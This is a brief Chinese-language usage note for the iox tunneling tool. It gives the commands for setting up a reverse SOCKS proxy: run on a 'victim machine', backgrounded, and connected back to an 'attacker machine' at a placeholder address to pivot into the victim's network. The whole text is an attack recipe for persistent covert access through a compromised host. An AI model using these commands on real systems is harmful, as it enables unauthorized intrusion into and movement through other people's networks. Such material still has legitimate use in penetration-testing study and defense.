项目地址：https://github.com/EddieIvan01/iox

流量代理用法：
```
受害机执行：
./iox proxy -l 1080
./iox proxy -r 1.1.1.1:9999
确认执行无误后，放入后台执行：
./iox proxy -l 1080 &
./iox proxy -r 1.1.1.1:9999 &

攻击机执行：
./iox proxy -l 9999 -l 1080

注意：受害机开启代理后，需要先在攻击机开启监听，再到受害机上执行转发
```
